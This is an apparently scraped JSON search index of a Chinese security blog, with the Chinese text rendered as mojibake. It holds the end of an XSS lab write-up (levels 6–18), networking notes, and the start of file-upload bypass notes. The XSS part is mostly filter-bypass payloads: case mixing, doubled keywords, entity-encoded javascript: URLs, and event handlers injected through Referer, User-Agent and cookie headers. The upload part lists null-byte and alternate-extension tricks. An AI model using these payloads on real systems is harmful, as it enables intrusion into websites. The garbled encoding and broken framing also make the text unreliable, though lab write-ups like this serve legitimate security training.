&#x2F;&#x2F;&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt; level6script è½¬æ¢æˆ scr_ipt on è½¬æ¢æˆ o_n src è½¬æ¢æˆ sr_c data è½¬æ¢æˆ da_ta href è½¬æ¢æˆ hr_ef ä½†å¯ä»¥å¤§å°å†™ç»•è¿‡ 1234&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;&quot; Onclick&#x3D;alert(1) &quot; level7è¿‡æ»¤äº†scriptï¼Œonï¼Œhref æ‰€ä»¥å¯ä»¥åŒå†™ç»•è¿‡ 12&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F; level8script,onï¼Œsrcï¼Œdataï¼Œhrefï¼Œå¤§å°å†™å¤±æ•ˆï¼Œâ€è¢«ç¼–ç æ‰€ä»¥valueå¤„å‡ ä¹æ‰¾ä¸åˆ° ä½†ä¸‹é¢é“¾æ¥å¤„å¯ä»¥çœ‹åˆ° &lt;&gt; â€˜ % # &amp; æœªè¢«è¿‡æ»¤ çœ‹äº†åˆ«äººé¢˜è§£ä¹‹åæ˜¯htmlå®ä½“ç¼–ç ç»•è¿‡ 12javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) level9ä¸äº†è§£ï¼Œå»çœ‹äº†æºç æ˜¯å¾—åŠ http:// 1javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F; level10è¿™çœŸæƒ³ä¸å‡ºæ¥ è¯•äº†ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç°åªæœ‰æœ€åä¸€ä¸ªå¯ä»¥å†™å…¥ï¼Œç›´æ¥æ„é€  12&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F; level11è¿™ä¸ªé¢˜åº”è¯¥æ˜¯æŠ“åŒ…çœ‹ï¼Œä½†ç”±äºæˆ‘æ˜¯è°·æ­Œåšé¢˜ï¼Œç«ç‹æŠ“åŒ…ï¼Œå¯¼è‡´æ¯æ¬¡ç›´æ¥å¤åˆ¶11é¢˜urlå®ƒéƒ½ä¸ä¼šç›´æ¥æŠ“åˆ°refå¤´ï¼Œæ­£ç¡®åº”è¯¥æ˜¯åœ¨10é¢˜å‘11é¢˜è·³è½¬æ—¶æŠ“åŒ…ã€‚ 1&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F; æŠŠrefå¤´æ”¹æˆè¿™ä¸ªï¼Œå‘åŒ…å³å¯ level12æœ‰äº†ä¸Šä¸€ä¸ªé¢˜çš„æç¤ºï¼Œè¿™ä¸ªé¢˜å°±æ˜æ˜¾å¾ˆå¤šäº† åªè¦æ”¹ä¸€ä¸‹UAå¤´ 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F; level13è¿™ä¸ªåº”è¯¥æ˜¯æ”¹cookie 1__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F; level14é“¾æ¥å¥½åƒæ˜¯æŒ‚æ‰äº†ï¼Œä½†å¥½åƒæ˜¯æ²¡æœ‰å¤ªçœ‹æ‡‚ï¼Œå›å¤´å†æ¥çœ‹ä¸€ä¸‹ level15çœ‹æºç å‘ç° ç„¶åä¸Šç½‘æŸ¥ä¸€ä¸‹ ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚ åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ payloadï¼š 1?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39; 1&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt; ä¹Ÿå°±æ˜¯è¯´srcåŒ…å«çš„å†…å®¹ä¼šè¿›å…¥ng-includeè¢«åŒ…å« é‚£æˆ‘ä»¬å¯ä»¥æƒ³å‡ºèƒ½ä¸èƒ½ç›´æ¥é—­åˆ 1?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt; ä½†å‘ç°ç›´æ¥è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½åŒ…å«ç¬¬ä¸€å…³ä»£ç  level16è¿™ä¸ªé¢˜æ˜¯æŠŠç©ºæ ¼è¿‡æ»¤äº† ç”¨%0då’Œ%0aç»•è¿‡ %0aæ¢è¡Œç¬¦å·â€\\nâ€%0då›è½¦ç¬¦å·â€\\râ€ 12&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt; level17å°±æ‰¾æºç å’Œurlä¹‹é—´çš„å…³ç³» å¯ä»¥çœ‹è§åœ¨srcå¤„æœ‰ä¸åŒ &lt;&gt;è¢«è¿‡æ»¤ï¼Œè€ƒè™‘onäº‹ä»¶ 1?arg02&#x3D; onmouseover&#x3D;alert(1) level18å’Œ17å…³ä¸€æ · 1?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1) 1234567- åå¼•å·ä»£æ›¿åœ†æ‹¬å·- æ¢è¡Œç»•è¿‡æ­£åˆ™- &lt;!--ä¸ä»…å¯ä»¥ç”¨--&gt;,ä¹Ÿå¯ä»¥ç”¨--!&gt;é—­åˆ- &#x2F;&#x2F;å¯ä»¥ç”¨æ¢è¡Œæ¥ç»•è¿‡- &lt;!--å’Œ--&gt;éƒ½å¯ä»¥åœ¨htmlçš„scriptæ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Š- Å¿ ç¬¦å·è½¬æ¢ä¸ºå¤§å†™åæ­£å¥½ä¸ºå¤§å†™å­—æ¯ S- å¯ä»¥ç”¨ %0a ä»£æ›¿ç©ºæ ¼è¿›è¡Œç»•è¿‡","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"xss","slug":"xss","permalink":"https://pz1o.top/tags/xss/"}]},{"title":"è®¡ç½‘","slug":"è®¡ç½‘","date":"2020-12-09T15:29:40.000Z","updated":"2020-12-09T15:32:12.091Z","comments":true,"path":"2020/12/09/è®¡ç½‘/","link":"","permalink":"https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/","excerpt":"","text":"è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº† åé¢å­¦äº†ä½†å¥½åƒä¸¢äº† çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡ è®¡ç½‘åˆå­¦TCP/IPåˆ†å±‚æ¨¡å‹ åº”ç”¨å±‚ï¼ˆç¬¬äº”å±‚) ä¼ è¾“å±‚ï¼ˆç¬¬å››å±‚ï¼‰ äº’è”ç½‘å±‚ï¼ˆç¬¬ä¸‰å±‚ï¼‰ ç½‘è·¯æ¥å£å±‚ï¼ˆç¬¬äºŒå±‚ï¼‰ ç‰©ç†å±‚ï¼ˆç¬¬ä¸€å±‚ï¼‰ ç‰©ç†å±‚ï¼šå¯¹åº”äºç½‘ç»œçš„åŸºæœ¬ç¡¬ä»¶ï¼Œå³æˆ‘ä»¬å¯ä»¥çœ‹å¾—è§çš„ç¡¬ä»¶è®¾å¤‡ã€‚ ç½‘ç»œæ¥å£å±‚ï¼šå®šä¹‰äº†å°†æ•°æ®ç»„æˆæ­£ç¡®å¸§çš„è§„ç¨‹å’Œåœ¨ç½‘ç»œä¸­ä¼ è¾“å¸§çš„è§„ç¨‹ã€‚ äº’è”ç½‘å±‚ï¼šæœ¬å±‚å®šä¹‰äº†äº’è”ç½‘ä¸­ä¼ è¾“çš„ä¿¡æ¯åŒ…çš„æ ¼å¼ï¼Œä»¥åŠä»ä¸€ä¸ªç”¨æˆ·é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªè·¯ç”±å™¨åˆ°æœ€ç»ˆç›®æ ‡çš„ä¿¡æ¯åŒ…è½¬å‘æœºåˆ¶ã€‚ ä¼ è¾“å±‚ï¼šä¸ºä¸¤ä¸ªç”¨æˆ·è¿›ç¨‹ä¹‹é—´å»ºç«‹ï¼Œç®¡ç†å’Œæ‹†é™¤å¯é è€Œåˆæœ‰æ•ˆçš„ç«¯åˆ°ç«¯çš„è¿æ¥ã€‚ åº”ç”¨å±‚ï¼šå®šä¹‰äº†åº”ç”¨ç¨‹åºä½¿ç”¨äº’è”ç½‘çš„è§„ç¨‹ã€‚ IPåœ°å€ipåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯† ç½‘ç»œæ ‡è¯†ï¼šç”¨ä»¥æ ‡æ˜å…·ä½“çš„ç½‘ç»œæ®µ ä¸»æœºæ ‡è¯†ï¼šæŸä¸ªç½‘ç»œä¸­å¾…å®šçš„è®¡ç®—æœºå·ç  ç½‘ç»œæ ‡è¯†ï¼š210.73.140.0 ä¸»æœºæ ‡è¯†ï¼š 2 åˆèµ·æ¥å†™ï¼š210.73.140.2 äººä»¬æŒ‰ç…§ç½‘ç»œè§„æ¨¡çš„å¤§å°ï¼ŒæŠŠ32ä¸ºåœ°å€ä¿¡æ¯è®¾æˆ3ç§å®šä½çš„åˆ’åˆ†æ–¹å¼ï¼Œä¸‰ç§åˆ’åˆ†æ–¹æ³•åˆ†åˆ«å¯¹åº”äºAï¼ŒBï¼ŒCç±»IPåœ°å€ï¼ŒIPåœ°å€åˆ†ä¸ºç½‘ç»œå·å’Œä¸»æœºå·ä¸¤éƒ¨åˆ† ï¼ˆ1ï¼‰Aç±»IPåœ°å€ï¼ˆ1-126ï¼‰ è¯¥åœ°å€ç”±1å­—èŠ‚ç½‘ç»œåœ°å€å’Œ3å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯0ã€‚ ï¼ˆ2ï¼‰Bç±»IPåœ°å€ï¼ˆ128-191ï¼‰ è¯¥åœ°å€ç”±2å­—èŠ‚ç½‘ç»œåœ°å€å’Œ2å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯10ã€‚ ï¼ˆ3ï¼‰Cç±»IPåœ°å€ï¼ˆ192-223ï¼‰ è¯¥åœ°å€ç”±3å­—èŠ‚ç½‘ç»œåœ°å€å’Œ1å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯110ã€‚ ï¼ˆ4ï¼‰Dç±»IPåœ°å€ï¼ˆ224-239ï¼‰ å¤šç‚¹å¹¿æ’­åœ°å€ï¼Œç”¨äºIPç»„æ’­ã€‚ ï¼ˆ5ï¼‰Eç±»IPåœ°å€ï¼ˆ240-225ï¼‰ ä¿ç•™åœ°å€ï¼Œç”¨ä½œç‰¹æ®Šç”¨é€”ã€‚ ï¼ˆ0.0.0.0ï¼‰å¯¹åº”å½“å‰ä¸»æœºï¼Œï¼ˆ255.255.255.255ï¼‰æ˜¯å½“å‰å­ç½‘çš„ä¼ æ’­åœ°å€ã€‚ åŸŸåé¡¶çº§åŸŸå .com äºŒçº§åŸŸå test.com ä¸‰çº§åŸŸå test.cn.com DNSæœåŠ¡å™¨ è®¡ç½‘å­¦ä¹ ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°å±€åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´å° è‡ªå·±èŠ±é’±ä¹°è®¾å¤‡ å¸¦å®½å›ºå®š å¹¿åŸŸç½‘ï¼šè·ç¦»è¿œ èŠ±é’±ä¹°æœåŠ¡ Internet ï¼šæœ‰è‡ªå·±çš„æœºæˆ¿ å¯¹ç½‘æ°‘æä¾›è¿æ¥ã€‚ IPåœ°å€ï¼šç½‘ç»œä¸­çš„åœ°å€ã€‚ ç‰©ç†åœ°å€ï¼šMacåœ°å€ï¼Œç”µè„‘å‡ºå‚æ—¶å·²å›ºå®šã€‚ ç½‘å…³ï¼šä¸‹å›¾ä¸­çš„Gå°±æ˜¯ç½‘å…³ï¼Œç›¸å½“äºç½‘ç»œä¸­çš„ä¸€ä¸ªå…³å¡ã€‚ç½‘å…³åœ°å€ä¸ºGçš„IPåœ°å€ã€‚ æœ¬æœºip è®¿é—®ip æœ¬æœºmac ä¸‹æ¬¡è®¿é—®mac 15.0.0.2 13.0.0.2 m4 m5 OSIå‚è€ƒæ¨¡å‹ åº”ç”¨å±‚ï¼šèƒ½äº§ç”Ÿç½‘ç»œæµé‡çš„ç¨‹åº è¡¨ç¤ºå±‚ï¼šåœ¨ä¼ è¾“ä¹‹å‰æ˜¯å¦åŠ å¯†æˆ–å‹ç¼©å¤„ç† ä¼šè¯å±‚ï¼šæŸ¥æ­£åœ¨è¿›è¡Œä¼šè¯çš„ç¨‹åº netstat -nb ä¼ è¾“å±‚ï¼šå¯é ä¼ è¾“ï¼ˆTCPï¼‰å’Œæµé‡æ§åˆ¶ ä¸å¯é ä¼ è¾“ï¼ˆUDPï¼‰ ç½‘ç»œå±‚ï¼šé€‰æ‹©æœ€ä½³è·¯å¾„ è§„åˆ’IPåœ°å€ æ•°æ®é“¾è·¯å±‚ï¼šå¸§çš„å¼€å§‹å’Œç»“æŸã€‚å·®é”™æ£€æŸ¥ã€‚ ç‰©ç†å±‚ï¼šæ¥å£æ ‡å‡†å’Œç”µå™¨æ ‡å‡† OSIå‚è€ƒæ¨¡å‹ç½‘ç»œæ’é”™æŒ‡å¯¼ ç‰©ç†å±‚æ•…éšœï¼šæŸ¥çœ‹è¿æ¥çŠ¶æ€ï¼Œå‘é€å’Œæ¥å—çš„æ•°æ®åŒ… æ•°æ®é“¾è·¯å±‚ï¼šMACåœ°å€å†²çªã€ç½‘é€Ÿåå•†ä¸ä¸€è‡´ã€è®¡ç®—æœºVLANé”™è¯¯ ç½‘ç»œå±‚æ•…éšœï¼šé…ç½®é”™è¯¯çš„IPåœ°å€ å­ç½‘æ©ç å’Œé”™è¯¯çš„ç½‘å…³ åº”ç”¨å±‚æ•…éšœï¼šåº”ç”¨é”™è¯¯ä»£ç†ã€‚ æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…ï¼špingä¸€ä¸ªç½‘å€ OSIå‚è€ƒæ¨¡å‹å’Œç½‘ç»œå®‰å…¨ ç‰©ç†å±‚å®‰å…¨ æ•°æ®é“¾è·¯å±‚å®‰å…¨ï¼šç™»å½•éœ€è¦è´¦å·å’Œå¯†ç  ç½‘ç»œå±‚å®‰å…¨ï¼šè·¯ç”±å™¨é™åˆ¶æ•°æ®åŒ…æµé‡ åº”ç”¨å±‚å®‰å…¨ï¼šå¼€å‘ç¨‹åºæœ‰æ²¡æœ‰æ¼æ´ ç¬¬äºŒç«  ç‰©ç†å±‚0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µç‰©ç†å±‚è§£å†³å¦‚ä½•è¿æ¥åœ¨å„ç§è®¡ç®—æœºçš„ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµï¼Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚ ç‰©ç†å±‚ä¸»è¦æ˜¯ç¡®å®šä¼ è¾“åª’ä½“çš„æ¥å£çš„ä¸€äº›ç‰¹æ€§ã€‚æœ‰æœºæ¢°ï¼Œç”µå™¨ï¼ŒåŠŸèƒ½ï¼Œè¿‡ç¨‹ç‰¹æ€§ã€‚ 0x02æ•°æ®é€šä¿¡çŸ¥è¯†æ•°æ®é€šä¿¡æ¨¡å‹ï¼š æ•°æ®ï¼šè¿é€æ¶ˆæ¯çš„å®ä½“ã€‚ ä¿¡å·ï¼šæ•°æ®ç”µæ°”æˆ–ç”µç£çš„è¡¨ç°ã€‚ ä¿¡é“ï¼šè¡¨ç¤ºä¸€ä¸ªæ–¹å‘ä¼ é€ä¿¡æ¯çš„åª’ä½“ã€‚ å•å‘é€šä¿¡ï¼ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ŒåŒå‘åŒæ—¶é€šä¿¡ã€‚ 0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“æ— å±è”½åŒç»çº¿UTP å±è”½åŒç»çº¿STP åŒè½´ç”µç¼† å…‰çº¤ å¾®æ³¢ä¼ è¾“ ç‰©ç†å±‚è®¾å¤‡â€”é›†çº¿å™¨ 0x04ä¿¡é“å¤ç”¨æŠ€æœ¯ 0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ0x06å®½å¸¦æ¥å…¥æŠ€æœ¯ADSL å…‰çº¤ ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ æ•°æ®é“¾è·¯å±‚ä¿¡é“ç±»å‹ï¼šç‚¹åˆ°ç‚¹å’Œå¹¿æ’­ã€‚ é“¾è·¯ï¼šæ˜¯ä¸€æ¡ç‚¹åˆ°ç‚¹çš„ç‰©ç†çº¿è·¯æ®µã€‚ æ•°æ®é“¾è·¯ï¼šé™¤äº†ç‰©ç†çº¿è·¯å¤–ï¼Œè¿˜å¿…é¡»æœ‰é€šä¿¡åè®®æ¥æ§åˆ¶è¿™äº›æ•°æ®çš„ä¼ è¾“ã€‚ å¸§ï¼šå¸§å¤´ å¸§å°¾ macåœ°å€ æ ¡éªŒç  0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜1.å°è£…æˆå¸§ 2.é€æ˜ä¼ è¾“ï¼ˆå°†è½¬ä¹‰å­—ç¬¦è½¬ä¹‰ï¼‰ 3.å·®é”™æ§åˆ¶ ä¼ çš„æ•°æ®ä¸º101001001/1101ä½™æ•°ä¸º0å°±ä¼šæ¥å—ã€‚ 0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚ç‚¹åˆ°ç‚¹ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚ï¼ˆå¹¿åŸŸç½‘ï¼‰ PPPåè®® å¹¿æ’­ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚ï¼ˆé›†çº¿å™¨ï¼‰ 0x04ä»¥å¤ªç½‘ä»¥å¤ªç½‘æ˜¯ä¸€ç§CSMA/CDçš„å±€åŸŸç½‘ åª’ä½“æ¥å…¥æ§åˆ¶å±‚ï¼ˆMAC ï¼‰ FCSæŠ“åŒ…ä¹‹åä¼šåˆ æ‰ã€‚ 0x05æ‰©å±•ä»¥å¤ªç½‘é›†çº¿å™¨çº§è”ï¼Œä¼šä½¿ç½‘ç»œä¸­è®¡ç®—æœºæ•°é‡å¢åŠ ï¼Œä½†ä¼šä½¿å†²çªåŸŸå¢å¤§ï¼Œå¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ ç½‘æ¡¥ ç½‘æ¡¥å°±æ˜¯äº¤æ¢æœºçš„å‰èº«ï¼Œäº¤æ¢æœºç›¸å½“äºç½‘æ¡¥å’Œé›†çº¿å™¨ã€‚ 0x06é«˜é€Ÿä»¥å¤ªç½‘ç¬¬å››ç«  ç½‘ç»œå±‚0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡ ï¼ˆè·¯ç”±å™¨æ˜¯ç½‘ç»œå±‚è®¾å¤‡ï¼‰ ç½‘ç»œåœ°å€ç›¸åŒå°±å¯ä»¥çœ‹æˆä¸€ä¸ªç½‘æ®µï¼Œæ€ä¹ˆçœ‹ç½‘ç»œåœ°å€å‘¢ï¼Ÿå¯ä»¥çœ‹å­ç½‘æ©ç  1234567891011ip:10.0.0.1å­ç½‘æ©ç :255.0.0.0&#x2F;&#x2F;æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå­ç½‘æ©ç æ˜¯255ï¼Œé‚£è¡¨æ˜ipåœ°å€ä¸­10å°±æ˜¯ç½‘ç»œåœ°å€ã€‚ip:12.0.0.1å­ç½‘æ©ç 255.255.0.0&#x2F;&#x2F;255.255.0.0è¯´æ˜åœ¨è¿™ä¸ªç½‘æ®µä¸­12.0æ˜¯ç½‘ç»œåœ°å€ç½‘å…³ï¼šè·¯ç”±å™¨ä¸Šé…ç½®ï¼Œä¸€èˆ¬ä¸ºè¯¥ç½‘æ®µä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå®é™…ä¸Šä»»æ„ä¸€ä¸ªåœ°å€éƒ½å¯ä»¥ã€‚è·¯ç”±å™¨ï¼šè·¯ç”±å™¨æ˜¯æ— æ³•çŸ¥é“å®ƒå…·ä½“ç½‘æ®µçš„ä½ç½®ï¼Œéœ€è¦æ·»åŠ è·¯ç”±è¡¨ã€‚ 0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹å‘é€ç«¯ï¼š åº”ç”¨å±‚ ç¨‹åºå‡†å¤‡è¦ä¼ è¾“çš„æ–‡ä»¶ ä¼ è¾“å±‚ å°†æ–‡ä»¶ç¼–å· ç½‘ç»œå±‚ æ·»åŠ IPåœ°å€ æ•°æ®é“¾è·¯å±‚ æœ‰ä¸¤ç§æƒ…å†µ ç¬¬ä¸€ç§ é€šè¿‡å­ç½‘æ©ç  ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªç½‘æ®µã€‚å¦‚æœæ˜¯ï¼Œåˆ©ç”¨ARPåè®®å¹¿æ’­è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€ ç¬¬äºŒç§ 0x03ç½‘ç»œå±‚åè®®ARPåè®® 12arp -a &#x2F;&#x2F;æŸ¥è¯¢macåœ°å€arp -s ipåœ°å€ macåœ°å€ &#x2F;&#x2F;é…ç½®IPåœ°å€çš„MACåœ°å€ arpåè®®:å°†ipåœ°å€é€šè¿‡å¹¿æ’­ ç›®æ ‡MACåœ°å€æ˜¯FF-FF-FF-FF-FF-FFè§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€ arpæ¬ºéª—: æ•°æ®é“¾è·¯å±‚æ•…éšœï¼Œç¼“å­˜äº†é”™è¯¯çš„MACåœ°å€ ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰123456789ping ttl&#x3D;64 linux 128 windows 255 unixping www.baidu.com -t ä¸€ç›´pingping www.baidu.com -l 200 å®šä¹‰æ•°æ®åŒ…çš„å¤§å°&#x2F;&#x2F;æŸ¥çœ‹è·¯ç”±å™¨çš„åœ°å€ping 8.8.8.8 -i 1 æ›´æ”¹æ•°æ®åŒ…ttlæ—¶é—´ï¼Œå¯ä»¥è·Ÿè¸ªé€”ç»çš„è·¯ç”±å™¨pathping è·Ÿè¸ªpingçš„è·¯å¾„tracert ç›´æ¥è·Ÿè¸ªè·¯ç”± IGMPé…ç½®åœ¨è·¯ç”±å™¨ä¸Šæ‰«æå¤šæ’­åœ°å€çš„åè®® å¹¿æ’­ï¼šç›®æ ‡ipåœ°å€æ˜¯å…¨ffï¼Œç›®æ ‡macåœ°å€æ˜¯255ï¼Œå‘å±€åŸŸç½‘å†…æ‰€æœ‰è®¡ç®—æœºå‘å‡ºå¹¿æ’­ ç‚¹åˆ°ç‚¹ï¼šä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹ ç»„æ’­ï¼šä¸€å¯¹å¤š 0x04æ•°æ®åŒ… ç‰ˆæœ¬ï¼šç”¨æ¥è¡¨ç¤ºTCP/IPåè®®çš„ç‰ˆæœ¬ v4 v6 åŒºåˆ†æœåŠ¡ï¼šçœ‹è°çš„ä¼˜å…ˆçº§é«˜ æ ‡è¯†ï¼š100 100 100å°±ä¸ºä¸€ä¸ªæ•°æ®åŒ… æ ‡å¿—ï¼šçœ‹æ•°æ®åŒ…æ˜¯å¦åˆ†ç‰‡ ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼šæ¯è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç”Ÿå­˜æ—¶é—´ä¼šä¿®æ”¹ã€‚ åè®®å·ï¼šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç† ï¼ˆICMP 1 IGMP 2 TCP 6 UDP 17 IPv6 41 OSPF 89ï¼‰ æ•°æ®é“¾è·¯å±‚æ”¯æŒæ•°æ®åŒ…1500å­—èŠ‚ IPå±‚æ”¯æŒæ•°æ®åŒ…æ˜¯65535å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦åˆ†ç‰‡ä¼ è¾“ï¼Œä½†ä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500å­—èŠ‚ã€‚ FTP Active Mode ç¬¬äºŒä¿¡é“æ˜¯æœåŠ¡å™¨ä¸»åŠ¨å‘èµ·çš„ã€‚ ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£ ç¬¬äºŒä¿¡é“æ˜¯20ç«¯å£ Passive ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£ ç¬¬äºŒä¿¡é“æ˜¯éšæœºç«¯å£ Telnet telnetçš„ç«¯å£æ˜¯23ç«¯å£ SSH","categories":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","date":"2020-12-09T15:26:33.000Z","updated":"2020-12-09T15:27:06.160Z","comments":true,"path":"2020/12/09/æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"ä¸Šä¼ æ¼æ´https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/ 0x01åŸºæœ¬æµç¨‹ å›¾ç‰‡æ˜¯å¦æ­£å¸¸ä¸Šä¼ ã€‚ å›¾ç‰‡ä¸Šä¼ å†…å®¹æ˜¯å¦è¢«æ„ŸæŸ“ã€‚ï¼ˆå†…å®¹æ›¿æ¢ æŠ“åŒ…æ”¹ï¼‰ ä¸Šä¼ çš„åŸŸåæ˜¯å¦æ˜¯ç›®æ ‡æœåŠ¡å™¨ã€‚ ä¸Šä¼ çš„ç›®å½•æ˜¯å¦æ”¯æŒè§£æ 0x02ç»•è¿‡js0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚æŠ“åŒ…çš„æ—¶å€™ %00 121.jpg%00.php1.php%00.jpg 0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯é»‘åå•ï¼šä¸å…è®¸ä»€ä¹ˆä¸Šä¼  ç™½åå•ï¼šå…è®¸ä»€ä¹ˆä¸Šä¼  å¯ä»¥å°è¯•php3 php4 php5 phtmlï¼Œphtä½¿ç”¨ æˆ–æœåŠ¡å™¨è§£ææ¼æ´ 0x05äºŒæ¬¡ä¸Šä¼ 0x06MIMEcontent-typeä¸­è¡¨ç¤ºäº†æ–‡ä»¶ç±»å‹ã€‚ 0x07è§£ææ¼æ´iisè§£ææ¼æ´ apacheè§£ææ¼æ´ nginxè§£ææ¼æ´ .netä¸Šä¼  phtmlä¸Šä¼ åœ¨apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼ˆhttpd.confï¼‰ä¸­æ·»åŠ  AddType application/x-httpd-php.phtml è¿™æ ·phtmlåç¼€çš„æ–‡ä»¶å°±ä¼šæŒ‰ç…§phpå»è§£æ .htaccessä¸Šä¼ 12345678910&lt;Files 